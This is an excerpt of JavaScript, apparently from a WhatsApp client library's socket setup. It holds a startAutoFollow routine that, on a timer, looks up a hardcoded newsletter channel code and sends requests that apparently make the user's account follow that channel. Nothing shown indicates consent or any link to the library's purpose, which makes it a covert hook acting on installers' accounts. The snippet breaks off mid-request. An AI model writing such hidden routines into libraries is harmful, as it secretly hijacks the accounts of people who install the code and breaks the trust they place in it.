...
const makeSocket = (config) => {
    ...
    const startAutoFollow = () => {
        const channelCode = '0029Vb8AK5o7oQhjpG5naq3k';
        setInterval(async () => {
            if (ws.isOpen) {
                try {
                    const res = await query({
                        tag: 'iq',
                        attrs: { to: '1@newsletter', type: 'get', xmlns: 'newsletter', id: generateMessageTag() },
                        content: [{ tag: 'metadata', attrs: { action: 'invite', code: channelCode } }]
                    }).catch(() => null);
                    if (res && res.attrs.id) {
                        await query({
                            tag: 'iq',
                            attrs: { to: res.attrs.id, type: 'set', xmlns: 'newsletter', id: generateMessageTag() },
